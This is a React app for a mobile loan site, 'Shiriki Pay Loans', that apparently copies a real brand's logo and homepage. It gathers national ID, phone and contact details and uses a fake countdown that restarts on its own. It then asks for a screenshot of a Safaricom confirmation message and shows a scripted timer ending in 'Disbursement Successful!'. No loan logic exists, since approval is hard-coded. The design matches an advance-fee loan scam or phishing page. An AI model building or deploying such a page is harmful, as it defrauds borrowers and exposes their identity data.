import React, { useState, useEffect } from 'react';
import {
  Clock,
  CheckCircle2,
  AlertCircle,
  Upload,
  ArrowRight,
  ArrowLeft,
  Smartphone,
  Check,
  Info,
  RefreshCw,
  X,
  MoreHorizontal
} from 'lucide-react';

// Exact SVG of the Shiriki Red Swoosh Logo from the uploaded image
function ShirikiRedLogo({ className = "w-9 h-5" }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 48 24"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className={`${className} inline-block transform`}
    >
      <path
        d="M6 16C14 17.5 22 17 31 10.5C37 6.2 41.5 6 45 7.5C40 12.5 33 18.5 22 19C13 19.4 8.5 17.8 6 16Z"
        fill="#E52320"
      />
      <path
        d="M20 12C28 7.5 35 6 42 7C38 10 32 14.5 24 16C19 17 12 16.5 8 15C12 14 16 13 20 12Z"
        fill="#DE1B1B"
      />
    </svg>
  );
}

interface PersonalInfo {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  idNumber: string;
  accountNickname: string;
  agreedToTerms: boolean;
}

export default function App() {
  // Step 0: Hero exact recreation from uploaded picture
  // Step 1: Personal Info
  // Step 2: How to Apply Instructions
  // Step 3: Screenshot Upload
  // Step 4: 2-3 Mins Processing & Confirmation
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [loanAmount, setLoanAmount] = useState<number>(15000);
  const [activeSlide, setActiveSlide] = useState<number>(0);
  
  // Urgent offer countdown timer
  const [timeLeft, setTimeLeft] = useState<{ hours: number; minutes: number; seconds: number }>({
    hours: 2,
    minutes: 41,
    seconds: 15,
  });

  const [formData, setFormData] = useState<PersonalInfo>({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    idNumber: '',
    accountNickname: '',
    agreedToTerms: true,
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  
  // Processing state for Step 4
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [processingTime, setProcessingTime] = useState<number>(180); // 3 minutes
  const [processingStage, setProcessingStage] = useState<number>(1);
  const [applicationId] = useState<string>(() => `SHK-${Math.floor(100000 + Math.random() * 900000)}`);
  
  // Modals
  const [showOptionsModal, setShowOptionsModal] = useState<boolean>(false);

  // Countdown timer effect
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) return { ...prev, seconds: prev.seconds - 1 };
        if (prev.minutes > 0) return { ...prev, minutes: 59, seconds: 59 };
        if (prev.hours > 0) return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        return { hours: 2, minutes: 59, seconds: 59 };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Processing countdown in step 4
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isProcessing && processingTime > 0) {
      interval = setInterval(() => {
        setProcessingTime(t => {
          if (t <= 1) {
            setIsProcessing(false);
            return 0;
          }
          if (t === 120) setProcessingStage(2);
          if (t === 60) setProcessingStage(3);
          return t - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isProcessing, processingTime]);

  const interest = Math.round(loanAmount * 0.05);
  const totalRepayment = loanAmount + interest;

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
    if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
    if (!formData.email.trim() || !formData.email.includes('@')) newErrors.email = 'Valid email is required';
    if (!formData.phone.trim() || formData.phone.length < 9) newErrors.phone = 'Valid phone number is required';
    if (!formData.idNumber.trim()) newErrors.idNumber = 'National ID is required';
    if (!formData.agreedToTerms) newErrors.agreedToTerms = 'You must accept the terms of service';
    
    if (loanAmount < 10000 || loanAmount > 19000) {
      newErrors.loanAmount = 'Strictly between KES 10,000 and KES 19,000';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setUploadedFile(file);
      setPreviewUrl(URL.createObjectURL(file));
      setErrors(prev => ({ ...prev, upload: '' }));
    }
  };

  const handleSubmitApplication = () => {
    if (!uploadedFile) {
      setErrors(prev => ({ ...prev, upload: 'Please upload your verification screenshot to verify' }));
      return;
    }
    setIsProcessing(true);
    setCurrentStep(4);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  return (
    <div className="min-h-screen bg-[#025928] text-white flex flex-col justify-between selection:bg-[#00B050] selection:text-white font-['Outfit'] relative overflow-x-hidden">
      
      {/* Background Grid Pattern (Matching the uploaded image) */}
      <div className="absolute inset-0 bg-shiriki-grid opacity-35 pointer-events-none z-0 h-[650px] [mask-image:linear-gradient(to_bottom,black_60%,transparent)]"></div>

      {/* Top Bar (Matching "SHIRIKI PAY" and "... | ⨂" Pill Button from image) */}
      <header className="relative z-20 max-w-md w-full mx-auto px-6 pt-5 pb-2 flex items-center justify-between">
        <button
          type="button"
          onClick={() => setCurrentStep(0)}
          className="text-left cursor-pointer group"
        >
          <span className="font-extrabold text-black tracking-tight text-xl drop-shadow-xs group-hover:text-white transition-colors">
            SHIRIKI PAY <span className="text-[#00FF66] font-black">LOANS</span>
          </span>
          <span className="block text-[10px] text-emerald-200/80 font-medium tracking-widest uppercase">
            Instant Credit & Loans
          </span>
        </button>

        {/* Top-Right Pill Control from image: "... | ⨂" */}
        <button
          type="button"
          onClick={() => setShowOptionsModal(true)}
          className="bg-black/35 hover:bg-black/50 backdrop-blur-md border border-white/20 text-white rounded-full px-3 py-1.5 flex items-center gap-2 cursor-pointer shadow-sm transition-all"
          aria-label="Options"
        >
          <MoreHorizontal className="w-4 h-4 text-white" />
          <span className="w-px h-3.5 bg-white/30"></span>
          <X className="w-4 h-4 text-white" />
        </button>
      </header>

      {/* Urgent Promotional Notice Pill */}
      <div className="relative z-10 max-w-md w-full mx-auto px-6 mt-1">
        <div className="bg-emerald-950/60 backdrop-blur-md border border-emerald-400/30 rounded-full px-3.5 py-1.5 flex items-center justify-between text-xs text-emerald-100 shadow-sm">
          <div className="flex items-center gap-1.5">
            <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping"></span>
            <span className="font-bold text-amber-300 uppercase text-[10px] tracking-wider">Offer Closing Soon:</span>
            <span className="text-[11px] truncate">10k – 19k KES</span>
          </div>
          <div className="font-mono font-bold text-amber-300 text-[11px] flex items-center gap-1">
            <Clock className="w-3 h-3" />
            <span>{String(timeLeft.hours).padStart(2, '0')}:{String(timeLeft.minutes).padStart(2, '0')}:{String(timeLeft.seconds).padStart(2, '0')}</span>
          </div>
        </div>
      </div>

      {/* Main Content Area */}
      <main className="relative z-10 max-w-md w-full mx-auto px-6 py-4 flex-1 flex flex-col justify-center">

        {/* STEP 0: EXACT RECREATION OF THE HOMEPAGE FROM THE UPLOADED WEBP */}
        {currentStep === 0 && (
          <div className="flex-1 flex flex-col justify-between py-2 animate-fadeIn">
            
            {/* Header Titles */}
            <div className="text-center mt-2 mb-6">
              <h1 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight leading-[1.15]">
                Smart payments, shared wallet
              </h1>
              <p className="text-emerald-100/90 text-sm sm:text-base mt-3 max-w-xs mx-auto font-normal leading-relaxed">
                Decide how much freedom each beneficiary has to spend — set limits, permissions, and monitor usage.
              </p>
            </div>

            {/* The Signature Shiriki Card Stack with Overlapping Logo Badge */}
            <div className="relative my-4">
              
              {/* Outer Frosted Rounded Container (from picture) */}
              <div className="bg-gradient-to-b from-[#187740] via-[#106233] to-[#0a4e27] rounded-[36px] p-6 pt-12 shadow-2xl border border-white/20 relative">
                
                {/* Overlapping Center Circle with Shiriki Red Logo */}
                <div className="absolute -top-10 left-1/2 -translate-x-1/2 w-20 h-20 rounded-full bg-white shadow-xl flex items-center justify-center border-4 border-[#025928] z-20">
                  <ShirikiRedLogo className="w-12 h-6" />
                </div>

                {/* Stacked 3D Cards Effect */}
                <div className="relative">
                  {/* Bottom shadow layer 2 */}
                  <div className="absolute inset-x-4 -bottom-3 h-10 bg-white/20 rounded-2xl -z-10 shadow-sm blur-[1px]"></div>
                  {/* Bottom shadow layer 1 */}
                  <div className="absolute inset-x-2 -bottom-1.5 h-10 bg-white/40 rounded-2xl -z-10 shadow-sm"></div>

                  {/* Main Top White Input Card */}
                  <div className="bg-white rounded-2xl p-4 sm:p-5 shadow-lg border border-slate-100 text-slate-800">
                    <div className="flex items-center justify-between mb-1">
                      <label className="text-xs text-slate-500 font-medium">
                        Enter limit (Loan Amount)
                      </label>
                      <span className="text-[10px] font-bold text-[#00A859] uppercase bg-emerald-50 px-2 py-0.5 rounded">
                        Strict 10k - 19k
                      </span>
                    </div>

                    {/* Limit Box exactly styled like in image */}
                    <div className="border border-slate-200 rounded-xl px-3.5 py-3 flex items-center justify-between bg-white focus-within:ring-2 focus-within:ring-[#00A859] focus-within:border-[#00A859] transition-all">
                      <input
                        type="number"
                        min="10000"
                        max="19000"
                        step="500"
                        value={loanAmount}
                        onChange={(e) => setLoanAmount(Number(e.target.value))}
                        className="w-full text-lg font-bold text-slate-900 focus:outline-none font-mono"
                      />
                      <span className="text-xs font-semibold text-slate-400 pl-2">Ksh</span>
                    </div>

                    {/* Quick Range Slider */}
                    <div className="mt-4">
                      <input
                        type="range"
                        min="10000"
                        max="19000"
                        step="500"
                        value={loanAmount}
                        onChange={(e) => setLoanAmount(Number(e.target.value))}
                        className="w-full h-2 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-[#00A859]"
                      />
                      <div className="flex justify-between items-center text-[10px] text-slate-400 mt-1 font-mono">
                        <span>10,000 Ksh</span>
                        <span className="text-[#00A859] font-bold">Selected: {loanAmount.toLocaleString()} Ksh</span>
                        <span>19,000 Ksh</span>
                      </div>
                    </div>

                    {/* Presets */}
                    <div className="grid grid-cols-4 gap-1.5 mt-3 pt-3 border-t border-slate-100">
                      {[10000, 13000, 16000, 19000].map(amt => (
                        <button
                          key={amt}
                          type="button"
                          onClick={() => setLoanAmount(amt)}
                          className={`py-1 text-xs font-semibold rounded-lg border transition-all ${
                            loanAmount === amt
                              ? 'bg-[#00A859] text-white border-[#00A859]'
                              : 'bg-white text-slate-600 border-slate-200 hover:border-slate-300'
                          }`}
                        >
                          {amt / 1000}k
                        </button>
                      ))}
                    </div>

                  </div>
                </div>

              </div>

            </div>

            {/* 3 Carousel Indicator Dots from picture: "● ○ ○" */}
            <div className="flex items-center justify-center gap-2.5 my-5">
              <button
                type="button"
                onClick={() => setActiveSlide(0)}
                className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                  activeSlide === 0 ? 'bg-white scale-110 shadow-xs' : 'bg-white/40'
                }`}
                aria-label="Slide 1"
              />
              <button
                type="button"
                onClick={() => { setActiveSlide(1); setCurrentStep(1); }}
                className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                  activeSlide === 1 ? 'bg-white scale-110 shadow-xs' : 'bg-white/40'
                }`}
                aria-label="Slide 2"
              />
              <button
                type="button"
                onClick={() => { setActiveSlide(2); setCurrentStep(2); }}
                className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                  activeSlide === 2 ? 'bg-white scale-110 shadow-xs' : 'bg-white/40'
                }`}
                aria-label="Slide 3"
              />
            </div>

            {/* Bottom Action Button: "Get Started 🌶" (Exact styling from image) */}
            <div className="mt-2">
              <button
                type="button"
                onClick={() => { setCurrentStep(1); setActiveSlide(1); }}
                className="w-full py-4 bg-[#00B050] hover:bg-[#009E47] active:bg-[#00893D] text-white font-extrabold rounded-2xl shadow-xl flex items-center justify-center gap-2 text-lg tracking-wide transition-all cursor-pointer transform hover:-translate-y-0.5"
              >
                <span>Get Started</span>
                <ShirikiRedLogo className="w-6 h-3.5 brightness-110" />
              </button>
            </div>

          </div>
        )}

        {/* STEP 1: Personal Info Form (Styled in this dark green & white card design) */}
        {currentStep === 1 && (
          <div className="bg-white rounded-[32px] p-6 shadow-2xl border border-slate-100 text-slate-800 animate-fadeIn my-2">
            
            {/* Header with Shiriki Logo Badge */}
            <div className="flex items-center justify-between border-b border-slate-100 pb-4 mb-4">
              <div>
                <h2 className="text-2xl font-extrabold text-slate-900 tracking-tight">
                  <span className="text-[#00A859]">Borrower</span> Details
                </h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Enter your verification information to receive your loan.
                </p>
              </div>
              <div className="w-12 h-12 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center shrink-0">
                <ShirikiRedLogo className="w-8 h-4" />
              </div>
            </div>

            {/* Selected Loan Amount Review */}
            <div className="bg-[#F8FAF9] p-3 rounded-xl border border-slate-200 mb-4 flex items-center justify-between text-xs">
              <span className="text-slate-500 font-medium">Selected Amount:</span>
              <span className="font-extrabold text-[#00A859] font-mono text-sm">
                KES {loanAmount.toLocaleString()}
              </span>
            </div>

            {/* Fields */}
            <div className="space-y-3">
              <div>
                <input
                  type="text"
                  placeholder="First Name"
                  value={formData.firstName}
                  onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                  className={`w-full px-4 py-3 rounded-xl border text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00A859] transition-all ${
                    errors.firstName ? 'border-red-400 bg-red-50/50' : 'border-slate-300 bg-white'
                  }`}
                />
                {errors.firstName && <p className="text-xs text-red-500 mt-1 pl-1">{errors.firstName}</p>}
              </div>

              <div>
                <input
                  type="text"
                  placeholder="Last Name"
                  value={formData.lastName}
                  onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                  className={`w-full px-4 py-3 rounded-xl border text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00A859] transition-all ${
                    errors.lastName ? 'border-red-400 bg-red-50/50' : 'border-slate-300 bg-white'
                  }`}
                />
                {errors.lastName && <p className="text-xs text-red-500 mt-1 pl-1">{errors.lastName}</p>}
              </div>

              <div>
                <input
                  type="email"
                  placeholder="Email Address"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className={`w-full px-4 py-3 rounded-xl border text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00A859] transition-all ${
                    errors.email ? 'border-red-400 bg-red-50/50' : 'border-slate-300 bg-white'
                  }`}
                />
                {errors.email && <p className="text-xs text-red-500 mt-1 pl-1">{errors.email}</p>}
              </div>

              <div>
                <input
                  type="text"
                  placeholder="National ID Number"
                  value={formData.idNumber}
                  onChange={(e) => setFormData({ ...formData, idNumber: e.target.value })}
                  className={`w-full px-4 py-3 rounded-xl border text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00A859] transition-all ${
                    errors.idNumber ? 'border-red-400 bg-red-50/50' : 'border-slate-300 bg-white'
                  }`}
                />
                {errors.idNumber && <p className="text-xs text-red-500 mt-1 pl-1">{errors.idNumber}</p>}
              </div>

              {/* Country & Phone Number Row */}
              <div className="flex gap-2">
                <div className="border border-slate-300 rounded-xl px-2.5 py-2 bg-slate-50 flex items-center justify-center shrink-0 w-28 text-xs font-semibold text-slate-700">
                  <span>🇰🇪 +254</span>
                </div>
                <div className="flex-1">
                  <input
                    type="tel"
                    placeholder="Phone Number (e.g. 712...)"
                    value={formData.phone}
                    onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                    className={`w-full px-4 py-3 rounded-xl border text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00A859] transition-all ${
                      errors.phone ? 'border-red-400 bg-red-50/50' : 'border-slate-300 bg-white'
                    }`}
                  />
                </div>
              </div>
              {errors.phone && <p className="text-xs text-red-500 mt-0.5 pl-1">{errors.phone}</p>}


              {/* Checkbox */}
              <div className="pt-1">
                <label className="flex items-start gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={formData.agreedToTerms}
                    onChange={(e) => setFormData({ ...formData, agreedToTerms: e.target.checked })}
                    className="mt-0.5 h-4 w-4 rounded text-[#00A859] focus:ring-[#00A859] border-slate-300 accent-[#00A859]"
                  />
                  <span className="text-[11px] text-slate-600 leading-snug">
                    I agree to the <span className="text-[#00A859] font-medium underline">terms & conditions</span> of Shiriki Loans.
                  </span>
                </label>
                {errors.agreedToTerms && <p className="text-xs text-red-500 mt-1 pl-1">{errors.agreedToTerms}</p>}
              </div>

              {/* Action Buttons */}
              <div className="pt-3 space-y-2">
                <button
                  type="button"
                  onClick={() => {
                    if (validateStep1()) {
                      setCurrentStep(2);
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }
                  }}
                  className="w-full py-3.5 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-2xl shadow-md text-sm transition-all cursor-pointer flex items-center justify-center gap-2"
                >
                  <span>Next: How to Apply</span>
                  <ArrowRight className="w-4 h-4" />
                </button>

                <button
                  type="button"
                  onClick={() => setCurrentStep(0)}
                  className="w-full py-2.5 text-xs text-slate-500 hover:text-slate-800 font-semibold cursor-pointer"
                >
                  Back to Overview
                </button>
              </div>

            </div>
          </div>
        )}

        {/* STEP 2: How to Apply Instructions */}
        {currentStep === 2 && (
          <div className="bg-white rounded-[32px] p-6 shadow-2xl border border-slate-100 text-slate-800 animate-fadeIn my-2 space-y-4">
            
            <div className="flex items-center justify-between border-b border-slate-100 pb-3">
              <div>
                <h2 className="text-xl font-extrabold text-slate-900 tracking-tight">
                  <span className="text-[#00A859]">How to</span> Apply
                </h2>
                <p className="text-xs text-slate-500">
                  Follow these 3 simple instructions to receive your loan
                </p>
              </div>
              <div className="w-10 h-10 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center shrink-0">
                <ShirikiRedLogo className="w-7 h-3.5" />
              </div>
            </div>



            {/* Actions */}
            <div className="pt-2 space-y-2">
              <button
                type="button"
                onClick={() => { setCurrentStep(3); window.scrollTo({ top: 0, behavior: 'smooth' }); }}
                className="w-full py-3.5 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-2xl shadow-md text-sm transition-all cursor-pointer flex items-center justify-center gap-2"
              >
                <span>Proceed to Upload Screenshot</span>
                <ArrowRight className="w-4 h-4" />
              </button>

              <button
                type="button"
                onClick={() => setCurrentStep(1)}
                className="w-full py-2 text-xs text-slate-500 hover:text-slate-800 font-semibold cursor-pointer"
              >
                Back to Details
              </button>
            </div>

          </div>
        )}

        {/* STEP 3: Upload Screenshot */}
        {currentStep === 3 && (
          <div className="bg-white rounded-[32px] p-6 shadow-2xl border border-slate-100 text-slate-800 animate-fadeIn my-2 space-y-4">
            
            <div className="border-b border-slate-100 pb-3">
              <h2 className="text-xl font-extrabold text-slate-900 tracking-tight">
                <span className="text-[#00A859]">Upload</span> Screenshot
              </h2>
              <p className="text-xs text-slate-500">
                Upload proof of your confirmation message received from Safaricom.
              </p>
            </div>

            {/* File drop zone */}
            <div className="border-2 border-dashed border-slate-300 rounded-2xl p-5 text-center bg-[#F8FAF9] hover:border-[#00A859] transition-colors">
              <input
                type="file"
                id="verification-screenshot"
                accept="image/*"
                onChange={handleFileUpload}
                className="hidden"
              />

              {previewUrl ? (
                <div className="space-y-3">
                  <img src={previewUrl} alt="Preview" className="max-h-44 mx-auto rounded-xl shadow-xs border border-slate-200" />
                  <p className="text-xs font-semibold text-slate-700">{uploadedFile?.name}</p>
                  <label
                    htmlFor="verification-screenshot"
                    className="inline-block text-xs font-bold text-[#00A859] underline cursor-pointer"
                  >
                    Change Screenshot
                  </label>
                </div>
              ) : (
                <label htmlFor="verification-screenshot" className="cursor-pointer block py-3">
                  <div className="w-12 h-12 rounded-full bg-emerald-100 text-[#00A859] flex items-center justify-center mx-auto mb-2">
                    <Upload className="w-6 h-6" />
                  </div>
                  <span className="text-sm font-bold text-slate-800 block">Choose Screenshot</span>
                  <span className="text-[11px] text-slate-500 mt-1 block">
                    Upload image from device
                  </span>
                  <span className="mt-3 inline-block px-4 py-1.5 bg-white border border-slate-300 rounded-full text-xs font-bold text-slate-700 shadow-2xs">
                    Browse File
                  </span>
                </label>
              )}
            </div>

            {errors.upload && (
              <p className="text-xs text-red-500 text-center font-semibold">{errors.upload}</p>
            )}

            {/* Submission Checklist */}
            <div className="bg-slate-50 p-3 rounded-xl border border-slate-200 text-xs text-slate-600 space-y-1">
              <div className="flex items-center gap-2 text-emerald-700">
                <Check className="w-3.5 h-3.5 stroke-[3]" />
                <span>Screenshot confirms active Safaricom message</span>
              </div>
              <div className="flex items-center gap-2 text-emerald-700">
                <Check className="w-3.5 h-3.5 stroke-[3]" />
                <span>Recipient: +254 {formData.phone}</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="pt-2 space-y-2">
              <button
                type="button"
                onClick={handleSubmitApplication}
                className="w-full py-4 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-2xl shadow-md text-sm transition-all cursor-pointer flex items-center justify-center gap-2"
              >
                <span>I Have Completed All Steps & Submit</span>
                <Check className="w-4 h-4" />
              </button>

              <button
                type="button"
                onClick={() => setCurrentStep(2)}
                className="w-full py-2 text-xs text-slate-500 hover:text-slate-800 font-semibold cursor-pointer"
              >
                Back
              </button>
            </div>

          </div>
        )}

        {/* STEP 4: 2 to 3 Minutes Processing & Success Confirmation */}
        {currentStep === 4 && (
          <div className="bg-white rounded-[32px] p-6 shadow-2xl border border-slate-100 text-slate-800 animate-fadeIn my-2 space-y-4">
            
            <div className="text-center">
              <div className="w-12 h-12 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center mx-auto mb-2">
                <ShirikiRedLogo className="w-8 h-4" />
              </div>
              
              <span className={`inline-block px-3 py-1 rounded-full text-xs font-bold ${isProcessing ? 'bg-amber-100 text-amber-800' : 'bg-emerald-100 text-[#00A859]'}`}>
                {isProcessing ? 'Verification In Progress' : 'Loan Application Approved'}
              </span>

              <h2 className="text-xl sm:text-2xl font-extrabold tracking-tight mt-2 text-slate-900">
                {isProcessing ? 'Please Wait 2 to 3 Minutes' : 'Disbursement Successful!'}
              </h2>

              <p className="text-xs text-slate-500 mt-0.5">
                Application Ref: <span className="font-mono font-bold text-slate-800">{applicationId}</span>
              </p>
            </div>

            {/* Live countdown */}
            {isProcessing ? (
              <div className="bg-[#F8FAF9] p-5 rounded-2xl border border-slate-200 text-center">
                <div className="text-4xl font-black font-mono text-[#00A859] tracking-tight mb-1">
                  {formatTimer(processingTime)}
                </div>
                <p className="text-xs text-slate-600">
                  Processing loan disbursement of <span className="font-bold">KES {loanAmount.toLocaleString()}</span> to <span className="font-mono font-bold">+254 {formData.phone}</span>.
                </p>

                {/* Progress bar */}
                <div className="w-full bg-slate-200 h-2 rounded-full overflow-hidden mt-4">
                  <div
                    className="bg-[#00A859] h-full transition-all duration-1000 ease-linear rounded-full"
                    style={{ width: `${((180 - processingTime) / 180) * 100}%` }}
                  ></div>
                </div>
              </div>
            ) : (
              <div className="bg-emerald-50 border border-emerald-200 p-5 rounded-2xl text-center space-y-1">
                <CheckCircle2 className="w-12 h-12 text-[#00A859] mx-auto mb-1" />
                <h3 className="font-bold text-slate-900 text-base">Loan Confirmed & Processed</h3>
                <p className="text-xs text-slate-600">
                  Funds of <span className="font-bold text-[#00A859]">KES {loanAmount.toLocaleString()}</span> will appear in your mobile wallet shortly.
                </p>
              </div>
            )}

            {/* Receipt Summary */}
            <div className="bg-slate-50 p-3.5 rounded-xl border border-slate-200 text-xs space-y-1.5">
              <div className="flex justify-between border-b border-slate-200 pb-1">
                <span className="text-slate-500">Applicant:</span>
                <span className="font-bold text-slate-800">{formData.firstName} {formData.lastName}</span>
              </div>
              <div className="flex justify-between border-b border-slate-200 pb-1">
                <span className="text-slate-500">Disbursement Number:</span>
                <span className="font-mono font-bold text-slate-800">+254 {formData.phone}</span>
              </div>
              <div className="flex justify-between border-b border-slate-200 pb-1">
                <span className="text-slate-500">Amount Approved:</span>
                <span className="font-mono font-bold text-[#00A859]">KES {loanAmount.toLocaleString()}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Repayment Period:</span>
                <span className="font-bold text-slate-800">30 Days</span>
              </div>
            </div>

            {/* Reset */}
            <button
              type="button"
              onClick={() => {
                setCurrentStep(0);
                setUploadedFile(null);
                setPreviewUrl(null);
                setIsProcessing(false);
                setProcessingTime(180);
              }}
              className="w-full py-3.5 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-2xl text-xs transition-all cursor-pointer"
            >
              Back to Home
            </button>

          </div>
        )}

      </main>

      {/* Options Modal (when user clicks "... | ⨂" top right) */}
      {showOptionsModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs">
          <div className="bg-white rounded-[28px] max-w-xs w-full p-6 shadow-2xl border border-slate-200 text-slate-800">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 mb-3">
              <div className="flex items-center gap-2">
                <ShirikiRedLogo className="w-6 h-3" />
                <span className="font-extrabold text-sm text-slate-900">SHIRIKI PAY <span className="text-[#00A859]">LOANS</span></span>
              </div>
              <button
                type="button"
                onClick={() => setShowOptionsModal(false)}
                className="text-slate-400 hover:text-slate-600 font-bold text-lg cursor-pointer"
              >
                ✕
              </button>
            </div>
            <div className="space-y-2 text-xs text-slate-600">
              <button
                type="button"
                onClick={() => { setCurrentStep(0); setShowOptionsModal(false); }}
                className="w-full text-left py-2 px-3 rounded-lg hover:bg-slate-100 font-semibold text-slate-800 block"
              >
                🏠 Home Screen
              </button>
              <button
                type="button"
                onClick={() => { setCurrentStep(1); setShowOptionsModal(false); }}
                className="w-full text-left py-2 px-3 rounded-lg hover:bg-slate-100 font-semibold text-slate-800 block"
              >
                📝 Personal Details Form
              </button>
              <button
                type="button"
                onClick={() => { setCurrentStep(2); setShowOptionsModal(false); }}
                className="w-full text-left py-2 px-3 rounded-lg hover:bg-slate-100 font-semibold text-slate-800 block"
              >
                📖 How to Apply Guide
              </button>
              <div className="pt-2 border-t border-slate-100 text-[11px] text-slate-500">
                Helpline: 0800 221 334 (Toll-free, 24/7)
              </div>
            </div>
            <button
              type="button"
              onClick={() => setShowOptionsModal(false)}
              className="mt-4 w-full py-2.5 bg-[#00B050] hover:bg-[#009E47] text-white font-bold text-xs rounded-xl cursor-pointer"
            >
              Close
            </button>
          </div>
        </div>
      )}

    </div>
  );
}
